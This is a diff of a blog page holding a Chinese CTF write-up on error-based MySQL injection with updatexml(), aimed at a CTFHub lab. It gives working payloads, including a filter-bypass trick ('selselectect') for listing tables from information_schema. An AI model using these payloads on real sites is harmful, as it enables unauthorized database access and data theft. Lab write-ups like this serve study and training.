@@ -172,23 +172,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <meta name="referrer" content="no-referrer">
-
-<h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><p><code>updatexml()</code> 通过这个函数 可以让mysql产生报错信息 但是 还是会执行这个查询语句 查询的结果会跟报错信息一起返回</p>
+        <h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><p><code>updatexml()</code> 通过这个函数 可以让mysql产生报错信息 但是 还是会执行这个查询语句 查询的结果会跟报错信息一起返回</p>
 <p><code>0x7e</code> 是~的十六进制，用于显示完整信息，避免被吃</p>
 <h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.F12查看页面注释，有提示，在url中加入<code>?tips=1</code>出现报错信息</p>
 <p>2.burp抓包尝试在<code>name</code>后加上<code>&#39;</code>,会出现报错</p>
-<p>![image-20220314112201847](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314112201847.png)</p>
+<p>![logo](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314112201847.png)</p>
 <p>3.order by 4会报错，确定只有三列，这是一个报错注入</p>
-<p>![image-20220314112521952](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314112521952.png)</p>
+<p>![logo](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314112521952.png)</p>
 <p>4.用updatexml函数进行报错返回值</p>
-<p>![image-20220314115455054](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314115455054.png)</p>
+<p>![logo](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314115455054.png)</p>
 <p>构建语句发现只返回了一个~</p>
-<p>![image-20220314120622082](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314120622082.png)</p>
+<p>![logo](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314120622082.png)</p>
 <p>发现中间这个值才会被返回</p>
-<p>![image-20220314120731153](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314120731153.png)</p>
+<p>![logo](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314120731153.png)</p>
 <p>于是构造函数 <code>123&#39; and updatexml(1,concat(0x7e,(select 1)),1)#</code></p>
-<p>![image-20220314112836216](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314112836216.png)</p>
+<p>![logo](E:...          This is Uknow—JJ\A一些小记录\notes\CTFHUB-SQL注入-2\image-20220314112836216.png)</p>
 <p>查出库名为note <code>123’ and updatexml(1,concat(0x7e,(select database())),3)#</code></p>
 <p>构造语句</p>
 <p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from information_schema.tables where table_schema=’note‘)),1)#&amp;pass=xxxx</code></p>
